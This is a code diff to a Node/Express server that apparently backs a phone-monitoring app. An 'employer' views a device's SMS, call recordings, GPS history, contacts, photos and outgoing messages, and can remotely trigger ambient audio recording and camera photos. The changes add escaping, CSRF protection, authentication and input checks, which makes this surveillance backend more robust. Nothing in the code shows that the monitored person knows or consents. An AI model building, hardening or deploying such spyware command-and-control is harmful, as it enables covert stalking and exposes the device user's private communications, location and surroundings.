             <button class="btn btn-outline" onclick="window.location.href='/tokens'">← Back</button>
-            <button class="btn btn-danger" onclick="logout()">Logout</button>
+            <button class="btn btn-danger" onclick="window.location.href='/logout'">Logout</button>
         </div>
     </div>
     <div class="container">
@@ -857,7 +1150,7 @@ app.get('/device', async (req, res) => {
                 ${apps.length === 0 ? '<p class="no-data">No app usage data</p>' : `
                 <table>
                     <tr><th>App</th><th>Usage</th><th>Date</th></tr>
-                    ${apps.map(a => `<tr><td>${a.app_name}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${a.usage_date}</td></tr>`).join('')}
+                    ${apps.map(a => `<tr><td>${esc(a.app_name)}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${esc(a.usage_date)}</td></tr>`).join('')}
                 </table>`}
             </div>
         </div>
@@ -874,13 +1167,13 @@ app.get('/device', async (req, res) => {
                             Math.abs(r.recorded_at - c.called_at) < 60000
                         );
                         return `<tr>
-                            <td>${c.number}</td>
-                            <td>${c.contact_name || '-'}</td>
-                            <td>${c.call_type}</td>
+                            <td>${esc(c.number)}</td>
+                            <td>${esc(c.contact_name) || '-'}</td>
+                            <td>${esc(c.call_type)}</td>
                             <td>${c.duration_seconds}s</td>
-                            <td>${new Date(c.called_at).toLocaleString()}</td>
+                            <td>${esc(new Date(c.called_at).toLocaleString())}</td>
                             <td>${recording ? 
-                                `<audio controls src="data:audio/mp4;base64,${recording.audio_base64}" class="audio-mini"></audio>` : 
+                                `<audio controls src="data:audio/mp4;base64,${esc(recording.audio_base64)}" class="audio-mini"></audio>` : 
                                 '<span style="color:#9ca3af;font-size:12px">No recording</span>'
                             }</td>
                         </tr>`;
@@ -896,10 +1189,10 @@ app.get('/device', async (req, res) => {
                 <table>
                     <tr><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
                     ${sms.map(s => `<tr>
-                        <td>${s.number}</td>
-                        <td>${s.sms_type}</td>
-                        <td class="cell-text">${s.message_body}</td>
-                        <td>${new Date(s.received_at).toLocaleString()}</td>
+                        <td>${esc(s.number)}</td>
+                        <td>${esc(s.sms_type)}</td>
+                        <td class="cell-text">${esc(s.message_body)}</td>
+                        <td>${esc(new Date(s.received_at).toLocaleString())}</td>
                     </tr>`).join('')}
                 </table>`}
             </div>
@@ -912,11 +1205,11 @@ app.get('/device', async (req, res) => {
                 <table>
                     <tr><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
                     ${gps.map(g => `<tr>
-                        <td>${g.latitude}</td>
-                        <td>${g.longitude}</td>
-                        <td>${g.accuracy}m</td>
-                        <td><a class="map-link" href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td>
-                        <td>${new Date(g.received_at).toLocaleString()}</td>
+                        <td>${esc(g.latitude)}</td>
+                        <td>${esc(g.longitude)}</td>
+                        <td>${esc(g.accuracy)}m</td>
+                        <td><a class="map-link" href="https://maps.google.com/?q=${esc(g.latitude)},${esc(g.longitude)}" target="_blank">View</a></td>
+                        <td>${esc(new Date(g.received_at).toLocaleString())}</td>
                     </tr>`).join('')}
                 </table>`}
             </div>
@@ -928,7 +1221,7 @@ app.get('/device', async (req, res) => {
                 ${contacts.length === 0 ? '<p class="no-data">No contacts</p>' : `
                 <table>
                     <tr><th>Name</th><th>Number</th></tr>
-                    ${contacts.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}
+                    ${contacts.map(c => `<tr><td>${esc(c.name)}</td><td>${esc(c.number)}</td></tr>`).join('')}
                 </table>`}
             </div>
         </div>
@@ -940,12 +1233,12 @@ app.get('/device', async (req, res) => {
                 <table>
                     <tr><th>Preview</th><th>Filename</th><th>Type</th><th>Actual Size</th><th>Date</th><th>Action</th></tr>
                     ${media.map(m => `<tr>
-                        <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}" data-src="data:image/jpeg;base64,${m.thumbnail}" onclick="openLightbox(this)"/>` : '<span style="color:#9ca3af;font-size:12px">No preview</span>'}</td>
-                        <td>${m.filename}</td>
-                        <td>${m.media_type === 'video' ? '🎬 Video' + (m.duration_ms ? ' (' + Math.round(m.duration_ms / 1000) + 's)' : '') : (m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo')}</td>
+                        <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${esc(m.thumbnail)}" data-src="data:image/jpeg;base64,${esc(m.thumbnail)}" onclick="openLightbox(this)"/>` : '<span style="color:#9ca3af;font-size:12px">No preview</span>'}</td>
+                        <td>${esc(m.filename)}</td>
+                        <td>${esc(m.media_type) === 'video' ? '🎬 Video' + (m.duration_ms ? ' (' + Math.round(m.duration_ms / 1000) + 's)' : '') : (m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo')}</td>
                         <td>${Math.round(m.size_bytes / 1024)}KB</td>
-                        <td>${new Date(m.date_taken).toLocaleString()}</td>
-                        <td><button class="btn btn-sm btn-primary" onclick="requestDownload('${token}','${m.filename}','${m._id}')">Download Full</button></td>
+                        <td>${esc(new Date(m.date_taken).toLocaleString())}</td>
+                        <td><button class="btn btn-sm btn-primary" onclick="requestDownload(this,'${esc(token)}','${esc(m.filename)}','${esc(m._id)}')">Download Full</button></td>
                     </tr>`).join('')}
                 </table>`}
             </div>
@@ -994,10 +1287,10 @@ app.get('/device', async (req, res) => {
                             <tr><th>App</th><th>Sent To</th><th>Message</th><th>Date</th></tr>
                             ${notifications.filter(function(n) { return n.direction === 'outgoing'; }).map(function(n) {
                                 return '<tr>'
-                                    + '<td>' + n.app + '</td>'
-                                    + '<td>' + (n.recipient || n.chat_id || '-') + '</td>'
-                                    + '<td class="cell-text">' + n.message + '</td>'
-                                    + '<td>' + new Date(n.received_at).toLocaleString() + '</td>'
+                                    + '<td>' + esc(n.app) + '</td>'
+                                    + '<td>' + (esc(n.recipient || n.chat_id) || '-') + '</td>'
+                                    + '<td class="cell-text">' + esc(n.message) + '</td>'
+                                    + '<td>' + esc(new Date(n.received_at).toLocaleString()) + '</td>'
                                     + '</tr>';
                             }).join('')}
                         </table>
@@ -1058,6 +1351,7 @@ app.get('/device', async (req, res) => {
 
     <script>
     if (!localStorage.getItem('employer_id')) window.location.href = '/';
+    window.CSRF_TOKEN = '${res.locals.csrfToken}';
 </script>
 <script src="/dashboard.js"></script>
     </body></html>`);
@@ -1065,123 +1359,152 @@ app.get('/device', async (req, res) => {
 
 
 // Employer requests full image download
-app.post('/employer/request-download', async (req, res) => {
+app.post('/employer/request-download', smallJson, requireAuth, requireCsrf, requireOwnedToken, async (req, res) => {
     try {
-        const { token, filename, image_id } = req.body;
-        const existing = await DownloadRequest.findOne({ token, filename, status: 'pending' });
+        const filename = cleanFilename(req.body && req.body.filename);
+        if (!filename) return res.json({ success: false, message: 'Invalid filename' });
+        const existing = await DownloadRequest.findOne({ token: req.deviceToken, filename, status: 'pending' });
         if (existing) return res.json({ success: true, message: 'Already requested' });
-        await DownloadRequest.create({ token, filename, image_id });
+        await DownloadRequest.create({ token: req.deviceToken, filename, image_id: (req.body && req.body.image_id) || '' });
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('request-download error:', e);
+        res.json({ success: false, message: 'Failed to request download' });
     }
 });
 
 // Device polls for pending download requests
-app.get('/device/download-requests', async (req, res) => {
+app.get('/device/download-requests', deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        const requests = await DownloadRequest.find({ token, status: 'pending' });
+        const requests = await DownloadRequest.find({ token: req.deviceToken, status: 'pending' });
         res.json({ success: true, requests });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('download-requests error:', e);
+        res.json({ success: false, message: 'Failed to load requests' });
     }
 });
 
 // Device uploads full quality image
-app.post('/device/upload-full', async (req, res) => {
+app.post('/device/upload-full', bigJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        const { filename, full_image } = req.body;
+        const b = req.body || {};
+        const filename = cleanFilename(b.filename);
+        if (!filename || !isNonEmptyStr(b.full_image, 52 * 1024 * 1024)) {
+            return res.json({ success: false, message: 'Invalid upload data' });
+        }
+        // Only accept uploads for files the employer actually requested.
+        const existing = await DownloadRequest.findOne({ token: req.deviceToken, filename });
+        if (!existing) return res.json({ success: false, message: 'No pending request for this file' });
         await DownloadRequest.findOneAndUpdate(
-            { token, filename },
-            { full_image, status: 'uploaded' }
+            { token: req.deviceToken, filename },
+            { full_image: b.full_image, status: 'uploaded' }
         );
-        console.log(`Full image uploaded: ${filename} from ${token}`);
+        console.log(`Full image uploaded: ${filename} from ${maskToken(req.deviceToken)}`);
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('upload-full error:', e);
+        res.json({ success: false, message: 'Failed to save upload' });
     }
 });
 
 // Employer downloads full image then clears it
-app.post('/employer/download-full', async (req, res) => {
+app.post('/employer/download-full', smallJson, requireAuth, requireCsrf, requireOwnedToken, async (req, res) => {
     try {
-        const { token, filename } = req.body;
-        const request = await DownloadRequest.findOne({ token, filename, status: 'uploaded' });
+        const filename = cleanFilename(req.body && req.body.filename);
+        if (!filename) return res.json({ success: false, message: 'Invalid filename' });
+        const request = await DownloadRequest.findOne({ token: req.deviceToken, filename, status: 'uploaded' });
         if (!request) return res.json({ success: false, message: 'Image not ready yet' });
         const image = request.full_image;
         // Delete full image after download to save storage
         await DownloadRequest.findOneAndUpdate(
-            { token, filename },
+            { token: req.deviceToken, filename },
             { full_image: null, status: 'downloaded' }
         );
         res.json({ success: true, image });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('download-full error:', e);
+        res.json({ success: false, message: 'Failed to download' });
     }
 });
 
 // notification data is never injected directly into the HTML
-app.get('/device/notifications-data', async (req, res) => {
-    const token = req.query.token;
-    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(500);
+app.get('/device/notifications-data', requireAuth, requireOwnedToken, async (req, res) => {
+    const notifications = await Notification.find({ token: req.deviceToken }).sort({ received_at: -1 }).limit(500);
     res.json({ notifications });
 });
 
 // Employer sends command
-app.post('/employer/command', async (req, res) => {
+app.post('/employer/command', smallJson, requireAuth, requireCsrf, requireOwnedToken, async (req, res) => {
     try {
-        const { token, type, duration, facing } = req.body;
-        console.log('Command received:', { token, type, duration, facing }); // ← add this
-        const command = await Command.create({ token, type, duration: duration || 30, facing: facing || 'back' });
-        console.log('Command created:', command);
+        const b = req.body || {};
+        const type = String(b.type || '');
+        if (type !== 'record_ambient' && type !== 'take_photo') {
+            return res.json({ success: false, message: 'Unknown command type' });
+        }
+        const duration = Number.isInteger(b.duration) ? b.duration : 30;
+        if (duration < 1 || duration > 600) {
+            return res.json({ success: false, message: 'Invalid duration' });
+        }
+        const facing = b.facing === 'front' ? 'front' : 'back';
+        const command = await Command.create({ token: req.deviceToken, type, duration, facing });
+        console.log(`Command created: ${command._id} type=${type} from ${maskToken(req.deviceToken)}`);
         res.json({ success: true, command_id: command._id });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('command error:', e);
+        res.json({ success: false, message: 'Failed to send command' });
     }
 });
 
 // Device polls for pending commands
-app.get('/device/commands', async (req, res) => {
+app.get('/device/commands', deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const token = getToken(req);
-        const commands = await Command.find({ token, status: 'pending' });
+        const commands = await Command.find({ token: req.deviceToken, status: 'pending' });
         // Mark as executing
         for (const cmd of commands) {
             await Command.findByIdAndUpdate(cmd._id, { status: 'executing' });
         }
         res.json({ success: true, commands });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('commands error:', e);
+        res.json({ success: false, message: 'Failed to load commands' });
     }
 });
 
 // Device sends result
-app.post('/device/command-result', async (req, res) => {
+app.post('/device/command-result', smallJson, deviceLimiter, requireValidDeviceToken, async (req, res) => {
     try {
-        const { command_id, result, status } = req.body;
-        await Command.findByIdAndUpdate(command_id, { 
-            result, 
-            status: status || 'done',
+        const b = req.body || {};
+        const status = b.status === 'failed' ? 'failed' : 'done';
+        // Only the device that OWNS the command may post its result.
+        const cmd = await Command.findOne({ _id: b.command_id, token: req.deviceToken });
+        if (!cmd) return res.json({ success: false, message: 'Command not found' });
+        await Command.findByIdAndUpdate(cmd._id, {
+            result: isStr(b.result, 52 * 1024 * 1024) ? b.result : '',
+            status,
             completed_at: new Date()
         });
         res.json({ success: true });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('command-result error:', e);
+        res.json({ success: false, message: 'Failed to save result' });
     }
 });
 
 // Employer gets command results
-app.post('/employer/command-results', async (req, res) => {
+app.post('/employer/command-results', smallJson, requireAuth, requireCsrf, requireOwnedToken, async (req, res) => {
     try {
-        const { token } = req.body;
-        const commands = await Command.find({ token, status: 'done' })
+        const commands = await Command.find({ token: req.deviceToken, status: 'done' })
             .sort({ completed_at: -1 }).limit(20);
         res.json({ success: true, commands });
     } catch (e) {
-        res.json({ success: false, message: e.message });
+        console.error('command-results error:', e);
+        res.json({ success: false, message: 'Failed to load results' });
     }
+});
+
+// Server-side logout: destroys the session cookie.
+app.get('/logout', (req, res) => {
+    req.session.destroy(() => res.redirect('/'));
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
